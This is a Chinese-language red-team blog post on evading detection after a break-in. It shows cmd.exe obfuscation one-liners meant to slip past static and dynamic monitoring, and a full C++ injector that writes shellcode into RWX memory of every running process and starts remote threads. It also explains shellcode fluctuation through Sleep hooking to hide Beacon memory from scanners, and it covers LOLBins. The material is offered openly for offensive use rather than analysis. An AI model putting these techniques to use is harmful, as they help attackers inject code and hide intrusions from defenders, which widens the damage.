<p>红队在成功入侵一台机器后，会尽量使自己做的事情不容易被蓝队发现。所以攻击者可以把指令混淆，让蓝队无法轻易知道攻击者目前做了哪些坏事。如此一来，攻击者的入侵程度可能就会被错估，导致损失持续扩大。</p>
<p>混淆的目标可以是 Cmd 指令、Powershell 指令、Python、Javascript、C#、C&#x2F;C++ 代码等等</p>
<h2 id="检测方式"><a href="#检测方式" class="headerlink" title="检测方式"></a>检测方式</h2><h3 id="静态检测"><a href="#静态检测" class="headerlink" title="静态检测"></a>静态检测</h3><p>静态的检测方式一般是指从文件、注册表取得目标，可以直接读取内容做判断。</p>
<p>静态检测的优点：</p>
<ul>
<li>效率较高</li>
<li>只要有目标就可以检测</li>
</ul>
<p>缺点：</p>
<ul>
<li>比较容易绕过</li>
</ul>
<p>例如文件內容如下，里面加入了一个简单的插入符号混淆，静态检测就是会拿到原样的文件内容。</p>
<p>字符“^”是CMD命令中最常见的转义字符，该字符不影响命令的执行</p>
<p>正常的用途是因为在cmd环境中，有些字符具备特殊功能，如 &gt;、&gt;&gt;表示重定向，| 表示管道，&amp;、&amp;&amp;、|| 表示语句连接，它们都有特定的功能。如果需要把它们作为字符输出的话，就需要对这些特殊字符做转义处理：在每个特殊字符前加上转义字符^</p>
<h3 id="动态检测"><a href="#动态检测" class="headerlink" title="动态检测"></a>动态检测</h3><p>相对于静态检测，动态检测可以避免掉部分的混淆，因为有些混淆会在执行前载入内存时被解析。可以使用 ETW 或 Event Log 取得指令。</p>
<ul>
<li>优点<ul>
<li>比较不容易绕过</li>
</ul>
</li>
<li>缺点<ul>
<li>效率较低</li>
<li>需要满足特定的需求，例如执行</li>
</ul>
</li>
</ul>
<h2 id="混淆技巧"><a href="#混淆技巧" class="headerlink" title="混淆技巧"></a>混淆技巧</h2><h3 id="环境变量-Environment-Variable"><a href="#环境变量-Environment-Variable" class="headerlink" title="环境变量(Environment Variable)"></a>环境变量(Environment Variable)</h3><p>假设我们要执行 <code>whoami</code> 指令，我們可以通过把多个子字串拼接在一起來达成。<code>whoami</code> 的 <code>W</code>、<code>O</code>、<code>i</code> 从环境变量 SystemRoot 拿；<code>a</code>、<code>m</code> 从环境变量 Tmp 拿；<code>h</code> 则直接使用。把所有拼在一起就可以执行 <code>whoami</code> 了。</p>
<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">cmd</span> /c &quot;<span class="hljs-variable">%SystemRoot:~3,1%</span>h<span class="hljs-variable">%SystemRoot:~7,1%</span><span class="hljs-variable">%tmp:~-7,1%</span><span class="hljs-variable">%tmp:~-2,1%</span><span class="hljs-variable">%SystemRoot:~4,1%</span>&quot;<br></code></pre></td></tr></table></figure>

<p>不过这个方法只能绕过静态检测，使用 Sysmon 观察还是会是原本的指令。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510071608669.png" srcset="/img/loading.gif" lazyload alt="image-20251007160858616"></p>
<h3 id="For-Loop-Value-Extraction"><a href="#For-Loop-Value-Extraction" class="headerlink" title="For Loop Value Extraction"></a>For Loop Value Extraction</h3><p>这个混淆技巧主要是利用 Windows批处理指令的输出取得目标字符串。与环境变量不同的是它可以使用在任何指令上，而不仅限于 <code>set</code>。<code>For</code> 可以搭配 Delims、Tokens 使用。</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">cmd /k <span class="hljs-string">&quot;for /f &quot;</span><span class="hljs-attribute">Delims</span>=s\ <span class="hljs-attribute">Tokens</span>=4&quot; %a <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;set^|findstr PSM&#x27;</span>) <span class="hljs-keyword">do</span> %a<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure>

<p>这个技巧可以用来绕过静态与动态检测</p>
<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510071609114.png" srcset="/img/loading.gif" lazyload alt="image-20251007160927060"></p>
<h3 id="双引号-Double-Quotes"><a href="#双引号-Double-Quotes" class="headerlink" title="双引号(Double Quotes)"></a>双引号(Double Quotes)</h3><p>双引号在指令中被当作是一个连接用的字符，所以在指令中可以正常的使用它，可以将双引号插入在任何位置。</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">cmd</span><span class="language-bash"> /c p<span class="hljs-string">&quot;owe&quot;</span><span class="hljs-string">&quot;&quot;</span>rshe<span class="hljs-string">&quot;&quot;</span>ll</span><br></code></pre></td></tr></table></figure>

<h3 id="括号-Parentheses"><a href="#括号-Parentheses" class="headerlink" title="括号(Parentheses)"></a>括号(Parentheses)</h3><p>括弧中的指令会被当作是一组指令，无意义的括弧可以用来混淆指令</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">cmd</span><span class="language-bash"> /c (  (powershell))</span><br></code></pre></td></tr></table></figure>

<h3 id="逗号与分号"><a href="#逗号与分号" class="headerlink" title="逗号与分号"></a>逗号与分号</h3><p><code>,</code>、<code>;</code> 在指令中可以取代空白作为指令参数之间的分割字符，它们可以任意被插入在参数之间需要空白的地方</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">cmd</span><span class="language-bash">;;,,/c,;netstat</span><br></code></pre></td></tr></table></figure>



<h3 id="Call"><a href="#Call" class="headerlink" title="Call"></a>Call</h3><p><code>Call</code> 在 Cmd 指令中用来执行另一段指令，虽然它本身不是用来做混淆的，但是却可以让混淆的行为更低调.<code>call</code> 不会产生 字进程；而 <code>cmd /c</code> 会</p>
<h3 id="For-Loop-Encoding"><a href="#For-Loop-Encoding" class="headerlink" title="For-Loop Encoding"></a>For-Loop Encoding</h3><p>与 For Loop Value Extraction 不同，For-Loop Encoding 不会使用 Tokens、Delims 的方式拼凑出指令，而是直接写 For 循环把需要的字符从环境变量的目标index取出</p>
<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">cmd</span> /c &quot;<span class="hljs-built_in">set</span> final= &amp;&amp;<span class="hljs-built_in">set</span> unique=nets /ao&amp;&amp;<span class="hljs-keyword">for</span> %a <span class="hljs-keyword">in</span> (<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">2</span> <span class="hljs-number">6</span> <span class="hljs-number">2</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">0</span> <span class="hljs-number">7</span> a) <span class="hljs-keyword">do</span> <span class="hljs-keyword">if</span> %a==a (<span class="hljs-keyword">call</span> <span class="hljs-variable">%final%</span>) <span class="hljs-keyword">else</span> (<span class="hljs-keyword">call</span> <span class="hljs-built_in">set</span> final=<span class="hljs-variable">%final%</span><span class="hljs-variable">%unique:~%</span>a,<span class="hljs-number">1</span>%)<br></code></pre></td></tr></table></figure>







<h2 id="自动化工具"><a href="#自动化工具" class="headerlink" title="自动化工具"></a>自动化工具</h2><p>invoke-dosfuscation：<a target="_blank" rel="noopener" href="https://github.com/danielbohannon/Invoke-DOSfuscation">danielbohannon&#x2F;Invoke-DOSfuscation: Cmd.exe Command Obfuscation Generator &amp; Detection Test Harness</a></p>
<p>安装和使用:</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/gitblog_00234/article/details/142542662">Invoke-DOSfuscation 使用与安装指南-CSDN博客</a></p>
<h1 id="枚举RWX区域写入shellcode"><a href="#枚举RWX区域写入shellcode" class="headerlink" title="枚举RWX区域写入shellcode"></a>枚举RWX区域写入shellcode</h1><h2 id="简单介绍-4"><a href="#简单介绍-4" class="headerlink" title="简单介绍"></a>简单介绍</h2><p>从本地或远程进程注入和执行 shellcode 需要可以写入、读取和执行 shellcode 的内存。</p>
<p>一些 shellcode 注入技术分配<code>PAGE_EXECUTE_READWRITE</code>内存块，用 shellcode 填充它并创建一个指向该 shellcode 的线程。对于应用程序来说，这不是一件很常见的事情，非常容易被AV&#x2F;EDR 发现</p>
<p>还有一些技术是首先分配<code>PAGE_READWRITE</code>，将shellcode写入分配的内存，用它保护它<code>PAGE_EXECUTE_READ</code>然后执行它，这意味着目标进程中没有任何时间点有RWX内存块。它有点隐秘，可能有助于偷偷溜过 AV&#x2F;EDR。</p>
<p>但是这两种技术的共同点是它们仍然需要<strong>分配</strong>和<strong>保护</strong>内存（RW -&gt; RX 或 RWX）。话虽如此，其实我们可以去暴力破解&#x2F;枚举受感染系统上当前正在运行的目标进程 - 搜索它们分配的内存块并检查是否有任何这些受 RWX 保护，因此我们可以尝试写入&#x2F;读取&#x2F;执行它们，用来规避一些内存检测。</p>
<h2 id="具体实现-1"><a href="#具体实现-1" class="headerlink" title="具体实现"></a>具体实现</h2><p>循环遍历系统上的所有进程</p>
<p>查询各个进程的内存信息</p>
<p>循环遍历每个进程中所有分配的内存块</p>
<p>检查任何受 RWX 保护的内存块 &amp;&amp; 是私有的 &amp;&amp; 已提交</p>
<p>如果满足上述条件</p>
<p>打印出内存块的地址</p>
<p>将 shellcode 写入该内存块</p>
<p>创建一个远程线程，指向上一步写的shellcode</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;TlHelp32.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>	MEMORY_BASIC_INFORMATION mbi = &#123;&#125;;<br>	LPVOID offset = <span class="hljs-number">0</span>;<br>	HANDLE process = <span class="hljs-literal">NULL</span>;<br>	HANDLE snapshot = <span class="hljs-built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<br>	PROCESSENTRY32 processEntry = &#123;&#125;;<br>	processEntry.dwSize = <span class="hljs-built_in">sizeof</span>(PROCESSENTRY32);<br>	DWORD bytesWritten = <span class="hljs-number">0</span>;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> shellcode[] = <span class="hljs-string">&quot;&quot;</span>;<br><br>	<span class="hljs-built_in">Process32First</span>(snapshot, &amp;processEntry);<br>	<span class="hljs-keyword">while</span> (<span class="hljs-built_in">Process32Next</span>(snapshot, &amp;processEntry))<br>	&#123;<br>		process = <span class="hljs-built_in">OpenProcess</span>(MAXIMUM_ALLOWED, <span class="hljs-literal">false</span>, processEntry.th32ProcessID);<br>		<span class="hljs-keyword">if</span> (process)<br>		&#123;<br>			std::wcout &lt;&lt; processEntry.szExeFile &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>			<span class="hljs-keyword">while</span> (<span class="hljs-built_in">VirtualQueryEx</span>(process, offset, &amp;mbi, <span class="hljs-built_in">sizeof</span>(mbi)))<br>			&#123;<br>				<br>				<span class="hljs-keyword">if</span> (mbi.AllocationProtect == PAGE_EXECUTE_READWRITE &amp;&amp; mbi.State == MEM_COMMIT &amp;&amp; mbi.Type == MEM_PRIVATE)<br>				&#123;<br>					std::cout &lt;&lt; <span class="hljs-string">&quot;\tRWX: 0x&quot;</span> &lt;&lt; std::hex &lt;&lt; mbi.BaseAddress &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>					<span class="hljs-built_in">WriteProcessMemory</span>(process, mbi.BaseAddress, shellcode, <span class="hljs-built_in">sizeof</span>(shellcode), <span class="hljs-literal">NULL</span>);<br>					<span class="hljs-built_in">CreateRemoteThread</span>(process, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, (LPTHREAD_START_ROUTINE)mbi.BaseAddress, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>				&#125;<br>				offset = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);<br>			&#125;<br>			offset = <span class="hljs-number">0</span>;<br>		&#125;<br>		<span class="hljs-built_in">CloseHandle</span>(process);<br>	&#125;<br><br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>





<p>这里就不尝试了，因为他会向所有可读可写可执行的区域都写入shellcode，比较多。没开虚拟机不好演示</p>
<h1 id="shellcode游击"><a href="#shellcode游击" class="headerlink" title="shellcode游击"></a>shellcode游击</h1><h2 id="简单介绍-5"><a href="#简单介绍-5" class="headerlink" title="简单介绍"></a>简单介绍</h2><p>通过挂钩sleep不断加密和解密 shellcode 的内容，使shellcode所在内存在 RW 和 RX &#x2F; PAGE_NOACCESS 和RX 内存属性之间反复横跳，当我们的 shellcode 驻留在RW或 NoAccess内存页面中时，扫描器将无法追踪到它并将其转储进行进一步分析</p>
<h3 id="RW-–-RX工作原理"><a href="#RW-–-RX工作原理" class="headerlink" title="RW – RX工作原理"></a>RW – RX工作原理</h3><ol>
<li>从文件中读取 shellcode 的内容。</li>
<li>Hook <code>kernel32!Sleep</code> 指向我们的回调<code>MySleep</code> 。</li>
<li>通过 VirtualAlloc + memcpy + CreateThread 注入和启动 shellcode。</li>
<li>一旦 Beacon 尝试休眠，我们的 <code>MySleep</code> 回调就会被调用。</li>
<li>Beacon 的内存分配被加密并且内存页面属性被翻转到 <code>RW</code></li>
<li>然后脱钩<code>kernel32!Sleep</code> </li>
<li>在等待进一步通信时，会调用原来的<code>kernel32!Sleep</code>让 Beacon 进入睡眠状态。</li>
<li>sleep睡眠结束后，解密我们的 shellcode 的数据，将它的内存页属性翻转回 <code>RX</code> ，然后重新挂钩 <code>kernel32!Sleep</code> 以确保拦截后续睡眠。</li>
</ol>
<h3 id="NoAccess-–-RX工作原理"><a href="#NoAccess-–-RX工作原理" class="headerlink" title="NoAccess – RX工作原理"></a>NoAccess – RX工作原理</h3><ol>
<li>从文件中读取 shellcode 的内容。</li>
<li>Hook <code>kernel32!Sleep</code> 指向我们的回调。</li>
<li>通过 VirtualAlloc + memcpy + CreateThread 注入和启动 shellcode …</li>
<li>初始化向量异常处理程序 (VEH) 以设置我们自己的处理程序来捕获 <em>访问冲突</em> 异常。</li>
<li>一旦 Beacon 尝试休眠，我们的 <code>MySleep</code> 回调就会被调用。</li>
<li>Beacon 的内存分配被加密并且内存页面属性被翻转到 <code>PAGE_NOACCESS</code></li>
<li>然后脱钩<code>kernel32!Sleep</code></li>
<li>在等待进一步通信时，会调用原来的<code>kernel32!Sleep</code>让 Beacon 进入睡眠状态。</li>
<li>Sleep结束后，我们重新hook <code>kernel32!Sleep</code> ，保证后续sleep的拦截。</li>
<li>Shellcode 然后尝试恢复其执行，此时内存页属性是<code>PAGE_NOACCESS</code>，这会触发内存访问异常0xc0000005</li>
<li>我们的 VEH 处理程序捕获异常，解密并将内存页属性翻转回 <code>RX</code> 并在处理函数里面return EXCEPTION_CONTINUE_EXECUTION恢复 shellcode执行。</li>
</ol>
<p>工具:<a target="_blank" rel="noopener" href="https://github.com/mgeeky/ShellcodeFluctuation">https://github.com/mgeeky/ShellcodeFluctuation</a></p>
<p>现在不行了，那些安全厂商已经盯上了sleep这个函数。</p>
<h1 id="LOLbins"><a href="#LOLbins" class="headerlink" title="LOLbins"></a>LOLbins</h1><p>恶意软件研究人员 Christopher Campbell 和 Matt Greaber 创造了（LOL）一词。LOLBins 是 Living Off the Land Binaries 的缩写，用于解释使用受信任的预安装系统工具来传播恶意软件。有几种不同类型的 LOL 技术，包括 LOLBins，它使用<strong>Windows 二进制文件</strong>来隐藏恶意活动；LOLLibs，使用库；和使用脚本的 LOLScripts。</p>
<p>顾名思义，LOL就是将合法的系统实用程序和工具用于恶意的目的，LOL 的一些功能包括：DLL 劫持、隐藏负载、进程转储、下载文件、绕过 UAC 键盘记录、代码编译、日志规避、代码执行和持久性</p>
<p>要被视为 LOL，相关的二进制文件、库或脚本必须默认在系统上，或者由用户放在系统上。它还需要具有意想不到的功能，并且能够被重新利用，并且必须对攻击者有用。并且在运行时不会被标准 AV 工具检测到。</p>
<p>LoLBins往往与无文件落地和合法云服务结合使用，以提高在组织内不被发现的机会，通常是在后渗透阶段。</p>
<p>一些相关网站</p>
<p><a target="_blank" rel="noopener" href="https://lolbas-project.github.io/">https://lolbas-project.github.io/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/263960.html">https://www.freebuf.com/articles/system/263960.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/232074.html">https://www.freebuf.com/articles/system/232074.html</a></p>
<p><a target="_blank" rel="noopener" href="https://micro8.github.io/Micro8-HTML/Chapter1/81-90/86_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msiexec%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%85%AB%E5%AD%A3%E8%A1%A5%E5%85%85.html">第八十六课：基于白名单Msiexec执行payload第八季补充 · Micro8 系列教程</a></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/%E6%9D%82%E8%B0%88/" class="print-no-link">#杂谈</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>《ETW绕过、Shellcode游击与NTFS备用数据流杂谈：高级规避技术漫谈》</div>
      <div>http://example.com/2025/10/07/《ETW绕过、Shellcode游击与NTFS备用数据流杂谈：高级规避技术漫谈》/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>Author</div>
          <div>John Doe</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>Posted on</div>
          <div>October 7, 2025</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>Licensed under</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2025/10/08/%E3%80%8AProcessBreakOnTermination%E4%B8%8EThreadBreakOnTermination%E3%80%8B/" title="《ProcessBreakOnTermination与ThreadBreakOnTermination》">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">《ProcessBreakOnTermination与ThreadBreakOnTermination》</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/10/05/%E3%80%8A%E8%81%8A%E8%81%8A%E5%85%8D%E6%9D%80%E7%9A%84%E9%82%A3%E4%BA%9B%E2%80%9C%E5%B0%8F%E6%8A%8A%E6%88%8F%E2%80%9D%EF%BC%9A%E9%95%82%E7%A9%BA%E3%80%81%E4%BC%AA%E8%A3%85%E5%92%8C%E4%BB%A3%E7%A0%81%E8%97%8F%E5%8C%BF%E3%80%8B/" title="《聊聊免杀的那些“把戏”：镂空、伪装和代码藏匿》">
                        <span class="hidden-mobile">《聊聊免杀的那些“把戏”：镂空、伪装和代码藏匿》</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>Table of Contents</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
  </noscript>
</body>
</html>
